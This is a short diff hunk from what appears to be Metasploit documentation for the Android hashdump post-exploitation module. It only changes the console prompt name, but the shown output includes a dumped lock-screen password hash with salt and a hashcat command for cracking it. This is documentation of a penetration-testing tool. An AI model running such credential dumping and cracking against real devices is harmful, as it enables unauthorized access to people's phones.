@@ -100,7 +100,7 @@ resource (android.128.rb)> run
 [+] SHA1: EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b
 [+] Crack with: hashcat -m 5800 EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b
 [*] Post module execution completed
-msf5 post(android/gather/hashdump) > creds
+msf post(android/gather/hashdump) > creds
 Credentials
 ===========
 
